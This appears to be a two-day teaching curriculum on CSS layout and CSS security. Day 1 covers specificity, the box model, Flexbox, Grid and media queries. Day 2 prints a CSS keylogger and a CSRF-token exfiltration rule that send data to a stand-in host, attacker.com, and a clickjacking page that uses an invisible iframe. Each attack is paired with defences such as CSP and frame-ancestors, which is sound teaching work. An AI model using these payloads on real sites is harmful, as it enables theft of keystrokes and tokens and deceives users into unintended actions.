Day 1 — CSS Fundamentals, Layouts & Responsive Design 8 Hours

Theory Session 2 Hours

Theory is delivered from the front of the room. The instructor types every example live in the browser so students see the visual result immediately. Students take notes and follow along — there is no lab task in this session. Every concept here is used directly in Lab 1 and Lab 2 that follow.

1.1 — What is CSS and Why Does It Matter for Security? 20 min

🎯 Objective

Students understand the three ways to add CSS, the cascade and specificity rules that determine which style wins, and the box model that underlies every element's layout — including why box-model knowledge is essential for understanding clickjacking.

How it is achieved: The instructor demonstrates each CSS delivery method live, then edits the same element with rules of increasing specificity so students watch the winning rule change in real time. The box model is drawn and then recreated in code so students see the nested rectangles rendered in a browser.

CSS is the language that controls how an HTML page looks — colours, sizes, spacing, layout, and animation. HTML defines structure and meaning; CSS defines appearance. The two are intentionally separate, and keeping them separate is a security principle as well as a design principle.

The three ways to add CSS — in order of preference:

/* ── METHOD 1: INLINE (least preferred) ──────────────────────────── */ /* Written directly on the element. Hardest to maintain, and makes Content Security Policy (CSP) enforcement difficult. */ <p style="color: red; font-size: 18px;">Text</p> /* ── METHOD 2: INTERNAL (single-page demos only) ─────────────────── */ <head> <style> p { color: red; font-size: 18px; } </style> </head> /* ── METHOD 3: EXTERNAL (professional standard ✓) ────────────────── */ /* In the HTML head — one file shared by all pages */ <link rel="stylesheet" href="styles.css"> /* In styles.css */ p { color: red; font-size: 18px; }

Specificity — which rule wins when multiple rules target the same element:

/* Specificity order — from lowest to highest priority */ p { color: black; } /* Element selector — lowest (0,0,1) */ .highlight { color: blue; } /* Class selector — medium (0,1,0) */ #headline { color: green; } /* ID selector — high (1,0,0) */ /* style="…" — Inline style — highest (1,0,0,0) */ /* color: red !important — Overrides all — use sparingly */ /* Example: this paragraph has class="highlight" and id="headline" The ID rule wins — the text is green */ <p class="highlight" id="headline">Which colour wins?</p>

The Box Model — every element is a nested set of rectangles:

/* Box model — from inside out: content → padding → border → margin */ .card { width: 300px; /* content area width */ padding: 20px; /* space INSIDE the border */ border: 2px solid #1F3A6E; /* the border line */ margin: 16px; /* space OUTSIDE the border */ /* box-sizing: border-box makes width include padding + border */ /* Without it, a 300px element + 20px padding = 340px total — confusing */ box-sizing: border-box; /* ← always set this globally */ } /* Apply border-box to EVERYTHING — write this at the top of every CSS file */ *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
Security Connection — Box Model & Clickjacking: An attacker can position a transparent element with an extremely high z-index exactly over a visible button. The user sees the visible button, but their click lands on the invisible overlay. Understanding the box model and position + z-index is essential for understanding this attack — it is covered in full in the Day 2 theory and Lab 4.

1.2 — Core CSS Properties 30 min

🎯 Objective

Students can write CSS for colour, typography, display behaviour, and positioning — including understanding why opacity: 0 and high z-index are clickjacking enablers.

How it is achieved: Properties are grouped by purpose rather than listed alphabetically. Each group is demonstrated live with a visible before-and-after on screen. The positioning section ends with a live demonstration of an absolutely-positioned transparent overlay so students see the attack mechanism before they learn the defence.

Colours and Backgrounds:

.example { /* Named colour */ color: tomato; /* Hex — precise colour matching */ background-color: #1F3A6E; /* RGB */ border-color: rgb(31, 58, 110); /* RGBA — the fourth value is opacity: 0 = fully transparent, 1 = fully opaque */ background-color: rgba(31, 58, 110, 0.15); /* 15% opaque — nearly invisible */ /* Linear gradient */ background: linear-gradient(135deg, #1F3A6E, #E8931F); /* Background image */ background-image: url('hero.jpg'); background-size: cover; background-position:center; }

Typography:

body { font-family: 'Inter', Arial, sans-serif; /* fallback chain */ font-size: 16px; /* base — all rem values are relative to this */ line-height: 1.6; /* unitless: 1.6 × font-size */ color: #1a1a1a; } h1 { font-size: 2.5rem; } /* 2.5 × 16px = 40px */ h2 { font-size: 2rem; } /* 32px */ h3 { font-size: 1.5rem; } /* 24px */ p { font-size: 1rem; } /* 16px — matches base */ /* rem vs px: rem scales when the user increases their browser font size; px is fixed. Use rem for accessible, responsive typography. */ a { color: #E8931F; text-decoration: none; transition: color 0.2s ease; } a:hover { color: #1F3A6E; }

Display and Positioning:

/* ── DISPLAY VALUES ───────────────────────────────────────────── */ .block-element { display: block; } /* full width, starts on new line */ .inline-element { display: inline; } /* width = content, no line break */ .hidden-element { display: none; } /* removed from page entirely */ /* ── POSITION VALUES ──────────────────────────────────────────── */ .static { position: static; } /* default — follows document flow */ .relative { position: relative; } /* moves FROM its normal position */ .absolute { position: absolute; } /* removed from flow, placed inside nearest positioned ancestor */ .fixed { position: fixed; } /* placed relative to viewport, stays on scroll */ .sticky { position: sticky; } /* relative until scroll threshold, then fixed */ /* ── z-index — controls stacking order ───────────────────────── */ /* Higher z-index = on top. Only works on positioned elements. */ .bottom-layer { position: relative; z-index: 1; } .top-layer { position: absolute; z-index: 999; } /* ── CLICKJACKING MECHANISM — how the attack is set up ───────── */ /* An attacker creates this invisible overlay over a real button: */ .invisible-trap { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.01; /* nearly invisible — but still receives clicks */ z-index: 9999; /* sits on top of everything visible */ } /* The user sees the content below; clicks land on this invisible element above */
Security Alert: opacity: 0 makes an element invisible but it still occupies space and still receives click events. A fully transparent element at a high z-index is the core mechanism of clickjacking. Day 2 Lab 4 teaches all four defence layers that prevent this.

1.3 — Flexbox: One-Dimensional Layouts 30 min

🎯 Objective

Students can build navigation bars, card rows, and centred content blocks using Flexbox container and item properties — without using floats, tables, or position hacks.

How it is achieved: The instructor builds a navigation bar live from scratch using Flexbox, narrating each property as it is added. Students watch the layout shift on screen with each line. Then the instructor builds a responsive card row, showing how flex-wrap automatically reflows cards on a narrow screen.
/* ── FLEX CONTAINER PROPERTIES ──────────────────────────────────── */ .nav { display: flex; /* makes children into flex items */ flex-direction: row; /* row (default) | column */ justify-content: space-between; /* along main axis: start | end | center | space-between | space-around */ align-items: center; /* along cross axis: stretch | center | flex-start | flex-end | baseline */ flex-wrap: wrap; /* items wrap to next line if no room */ gap: 16px; /* space between items — cleaner than margins */ } /* ── FLEX ITEM PROPERTIES ────────────────────────────────────────── */ .nav-link { flex-grow: 0; /* 0 = don't grow, 1 = take available space */ flex-shrink: 1; /* 1 = can shrink, 0 = never shrink */ flex-basis: auto; /* starting size before grow/shrink */ /* shorthand: flex: grow shrink basis */ flex: 0 1 auto; } .card { flex: 1 1 280px; } /* grows, shrinks, minimum 280px wide */ /* ── EXAMPLE: REAL NAVIGATION BAR ───────────────────────────────── */ /* HTML: <header class="site-header"> <div class="logo">SQI</div> <nav class="nav"> <a href="#">Home</a> <a href="#">About</a> <a href="#">Projects</a> <a href="#">Contact</a> </nav> </header> */ .site-header { display: flex; justify-content: space-between; align-items: center; padding: 0 24px; height: 64px; background: #1F3A6E; } .nav { display: flex; gap: 24px; } .nav a { color: white; text-decoration: none; padding: 8px 12px; border-radius: 4px; transition: background 0.2s ease; } .nav a:hover { background: rgba(255,255,255,0.15); } .nav a[aria-current="page"] { background: #E8931F; } /* ── CENTERING — the classic flexbox trick ──────────────────────── */ .center-both { display: flex; justify-content: center; align-items: center; min-height: 100vh; /* full viewport height */ }
When to Use Flexbox: A navigation bar with items spaced evenly. A row of cards that wraps automatically. Centering a single element on the page. Any layout that flows in one direction at a time — either a row or a column, but not both simultaneously.

1.4 — CSS Grid: Two-Dimensional Layouts 25 min

🎯 Objective

Students can define a Grid with named areas, place elements precisely in both rows and columns, and use auto-fit with minmax() to create responsive grids that adapt their column count automatically.

How it is achieved: The instructor builds a complete page skeleton (header, sidebar, main, footer) live using named grid areas, then shows how a single minmax() line creates a fully responsive image gallery — no media query needed.
/* ── GRID FUNDAMENTALS ──────────────────────────────────────────── */ .page-layout { display: grid; grid-template-columns: 240px 1fr; /* sidebar | main */ grid-template-rows: 64px 1fr 80px; /* header | content | footer */ gap: 16px; min-height: 100vh; /* fr = fraction of available space */ /* 1fr fills whatever is left after fixed columns are placed */ } /* ── NAMED TEMPLATE AREAS ─────────────────────────────────────── */ .full-layout { display: grid; grid-template-columns: 240px 1fr; grid-template-rows: auto 1fr auto; grid-template-areas: "header header" "sidebar main " "footer footer"; min-height: 100vh; gap: 0; } header { grid-area: header; } aside { grid-area: sidebar; } main { grid-area: main; } footer { grid-area: footer; } /* ── RESPONSIVE GALLERY — auto-fit + minmax ───────────────────── */ /* No media query needed — columns add/remove automatically */ .gallery { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); /* ↑ min width ↑ max */ /* On 1200px screen → 4 columns | On 600px screen → 2 columns */ /* On 320px screen → 1 column — all automatic */ gap: 24px; } /* ── SPANNING CELLS ───────────────────────────────────────────── */ .featured-item { grid-column: span 2; /* stretches across 2 columns */ grid-row: span 2; /* stretches across 2 rows */ } /* ── REPEAT SHORTHAND ─────────────────────────────────────────── */ .three-col { grid-template-columns: repeat(3, 1fr); /* 3 equal columns */ }
Flexbox vs Grid — When to Use Which: Use Flexbox when content flows in one direction: a navigation row, a column of form fields, a row of cards. Use Grid when you need precise control of both rows and columns at the same time: a full page layout, a photo gallery with featured items, a dashboard. Many real pages use Grid for the outer shell and Flexbox inside each Grid area.

1.5 — Responsive Design & Media Queries 25 min

🎯 Objective

Students write mobile-first CSS using min-width media queries at four standard breakpoints, understand why the viewport meta tag is required, and can explain how responsive units like rem, vw, and clamp() work.

How it is achieved: The instructor opens a two-column layout with no media queries and resizes the browser window so students watch it break. They then add media queries one at a time and watch the layout recover at each breakpoint. The DevTools device toolbar is used throughout.
/* ── STEP 1: Viewport meta tag — required in every HTML file ──── */ /* Without this, mobile browsers render at 980px then zoom out */ <meta name="viewport" content="width=device-width, initial-scale=1"> /* ── STEP 2: Mobile-first base styles ────────────────────────── */ /* Write for the smallest screen first — no media query needed */ .site-header { display: flex; flex-direction: column; /* stack logo above nav on mobile */ padding: 12px 16px; } .skills-grid { display: grid; grid-template-columns: 1fr; /* single column on mobile */ gap: 16px; } h1 { font-size: 1.8rem; } /* smaller heading on phone */ /* ── STEP 3: Tablet — 768px and wider ───────────────────────── */ @media (min-width: 768px) { .site-header { flex-direction: row; /* logo and nav side by side */ padding: 0 24px; height: 64px; } .skills-grid { grid-template-columns: repeat(2, 1fr); /* 2 columns on tablet */ } h1 { font-size: 2.2rem; } } /* ── STEP 4: Desktop — 1024px and wider ─────────────────────── */ @media (min-width: 1024px) { .skills-grid { grid-template-columns: repeat(3, 1fr); /* 3 columns on desktop */ } h1 { font-size: 2.8rem; } } /* ── STEP 5: Large desktop — 1200px and wider ───────────────── */ @media (min-width: 1200px) { .container { max-width: 1140px; margin: 0 auto; } } /* ── RESPONSIVE UNITS ────────────────────────────────────────── */ .fluid-width { width: 80%; } /* % of parent container */ .full-height { height: 100vh; } /* 100% of viewport height */ .wide-hero { width: 100vw; } /* 100% of viewport width */ /* clamp(min, preferred, max) — fluid sizing with limits */ h1 { font-size: clamp(1.8rem, 5vw, 3.5rem); } /* ↑ never below 1.8rem ↑ never above 3.5rem ↑ scales with viewport width in between */ /* ── PRINT MEDIA QUERY ───────────────────────────────────────── */ @media print { nav, footer, .sidebar { display: none; } body { color: black; background: white; } /* Show the URL after each link when printing */ a::after { content: " (" attr(href) ")"; font-size: 0.8rem; } }

Day 2 — CSS Security, Clickjacking Prevention & Secure Styling 8 Hours

Theory Session 1 Hour

Day 2 reframes CSS entirely. Until now CSS has been a tool for appearance. Today students learn it is also an attack surface — it can read data, make network requests, and deceive users about what they are clicking. The instructor opens DevTools on live websites throughout this session to make every concept concrete.

2.1 — CSS as an Attack Vector 20 min

🎯 Objective

Students can explain three CSS-based attacks — CSS injection, the CSS keylogger, and attribute-selector data exfiltration — and state the root cause and prevention principle for each.

Attack 2 — CSS Keylogger: Stealing Keystrokes Without JavaScript

/* ── HOW THE ATTACK WORKS ────────────────────────────────────────── */ /* CSS attribute selectors can match an input's current value. background-image can trigger an HTTP request. Combined, an attacker builds a keystroke logger in pure CSS. */ /* For every character the user might type, inject a rule like this: */ input[value^="a"] { background-image: url("https://attacker.com/log?char=a"); } input[value^="b"] { background-image: url("https://attacker.com/log?char=b"); } input[value^="c"] { background-image: url("https://attacker.com/log?char=c"); } /* ... and so on for every letter, digit, and symbol */ /* As the user types each character, the matching rule fires a request. The attacker's server logs the requests and reconstructs what was typed. ⚠️ This requires NO JavaScript — pure CSS only. */ /* ── PREVENTION ──────────────────────────────────────────────────── */ /* 1. Never allow user-controlled CSS on your page (server sanitisation) */ /* 2. Add a Content Security Policy that blocks external style-src requests */ /* (see CSP examples in Lab 3) */ /* 3. Password inputs are SAFE — browsers do not expose the value attribute of <input type="password"> to CSS selectors */

Attack 3 — Attribute Selector Exfiltration: Stealing CSRF Tokens

/* ── THE VULNERABLE HTML ─────────────────────────────────────────── */ /* A hidden CSRF token stored in an attribute — readable by CSS */ <input type="hidden" name="csrf_token" value="a7f3..."> /* ── THE ATTACK CSS ──────────────────────────────────────────────── */ /* Attacker injects one rule per possible starting character: */ input[name="csrf_token"][value^="a"] { background-image: url("https://attacker.com/?token_starts=a"); } /* The browser matches the rule and fires the request. Attacker knows the first character is 'a'. Repeat for next character: value^="a7" → confirms second char is '7' Repeat until full token is reconstructed. */ /* ── SECURE ALTERNATIVE ──────────────────────────────────────────── */ /* Store CSRF tokens in JavaScript variables or HTTP-only cookies — neither is accessible to CSS attribute selectors */ /* In JavaScript (accessible to JS, not to CSS): */ const csrfToken = document.querySelector('[name=csrf_token]').value; // ← in HTML attr, CSS can see it // ✓ Better: embed in a meta tag only readable by JS <meta name="csrf-token" content="a7f3..."> // CSS cannot target meta[name="csrf-token"][content^="a"] in most browsers, // and a strict CSP blocks any exfiltration request anyway
Key Principle: CSS is a data channel. Any CSS property that can trigger an HTTP request — background-image, list-style-image, cursor, @font-face src — becomes an exfiltration vector if an attacker can control the URL. Preventing user-controlled CSS from reaching the page and enforcing a strict Content Security Policy are the two defences.

2.2 — Clickjacking and UI Redressing 40 min

🎯 Objective

Students can explain the exact CSS mechanism behind a clickjacking attack, describe its three main variants, and implement all four prevention layers: CSP frame-ancestors, X-Frame-Options, JavaScript frame-busting, and CSS visual indicators.

How it is achieved: The instructor builds the attack page live — a visible fake button under a transparent iframe — so students see every CSS property in use. Then all four prevention layers are added one at a time and tested. Students follow along and see each defence refuse the embed.

How Clickjacking Works — the CSS Mechanism:

/* ── THE ATTACKER'S PAGE — sets up the invisible iframe trap ────── */ /* Attacker's HTML: */ <div class="wrapper"> <!-- The real target site — invisible but receiving clicks --> <iframe src="https://victim-bank.com/transfer" class="invisible-frame"></iframe> <!-- The fake button the user actually sees --> <button class="decoy-button">🎁 Click to Claim Your Prize!</button> </div> /* Attacker's CSS: */ .wrapper { position: relative; width: 300px; height: 60px; } .invisible-frame { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.01; /* ← nearly invisible but still receives clicks */ z-index: 999; /* ← sits above the visible fake button */ border: none; } .decoy-button { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; /* ← BELOW the invisible iframe */ } /* User sees: 🎁 Click to Claim Your Prize! User clicks — the invisible iframe intercepts the click The click registers on the bank's Confirm Transfer button User sees: nothing changed — but the transfer happened */

Prevention — All Four Layers Together:

/* ════════════════════════════════════════════════════════════════ LAYER 1 — Content Security Policy: frame-ancestors (PRIMARY) Set as an HTTP response header — strongest defence ════════════════════════════════════════════════════════════════ */ /* In your web server config or server-side code: */ Content-Security-Policy: frame-ancestors 'none' /* 'none' — no one may embed this page in an iframe */ /* 'self' — only the same origin may embed it */ /* "https://trusted.com" — only that specific domain */ /* If you can only use HTML (no server config access): */ <meta http-equiv="Content-Security-Policy" content="frame-ancestors 'none'"> /* Note: meta tag CSP is weaker — the HTTP header is always preferred */ /* ════════════════════════════════════════════════════════════════ LAYER 2 — X-Frame-Options (backward compatibility) ════════════════════════════════════════════════════════════════ */ /* HTTP header — works in older browsers that predate CSP: */ X-Frame-Options: DENY /* DENY — blocks all framing */ /* SAMEORIGIN — allows same-origin framing only */ /* As a meta tag: */ <meta http-equiv="X-Frame-Options" content="DENY"> /* ════════════════════════════════════════════════════════════════ LAYER 3 — JavaScript Frame-Busting ════════════════════════════════════════════════════════════════ */ /* Add to the <head> of every protected page */ <script> // If this page is inside an iframe, escape immediately if (window !== window.top) { window.top.location = window.location.href; } </script> /* Limitation: the iframe's sandbox attribute can block this. This is why frame-busting is a supporting layer, not the primary defence. */ /* ════════════════════════════════════════════════════════════════ LAYER 4 — CSS Visual Warning Indicators ════════════════════════════════════════════════════════════════ */ /* A JavaScript block adds the "framed" class if inside an iframe. CSS then displays a visible warning banner. */ <script> if (window !== window.top) { document.body.classList.add('is-framed'); } </script> /* In CSS: */ body.is-framed::before { content: "⚠️ WARNING: This page is being displayed inside another website."; display: block; position: fixed; top: 0; left: 0; right: 0; padding: 14px 20px; background: #C62828; color: white; font-size: 1rem; font-weight:bold; text-align: center; z-index: 99999; } html.is-framed { border: 6px solid #C62828; /* red border around entire page */ }
Defence-in-Depth Summary: No single layer is enough alone. Use all four together: (1) frame-ancestors 'none' as the primary blocker; (2) X-Frame-Options: DENY for older browser compatibility; (3) JavaScript frame-busting as an additional runtime check; (4) CSS visual warning banner as a last-resort user-facing alert. Lab 4 implements and tests all four on a real page.
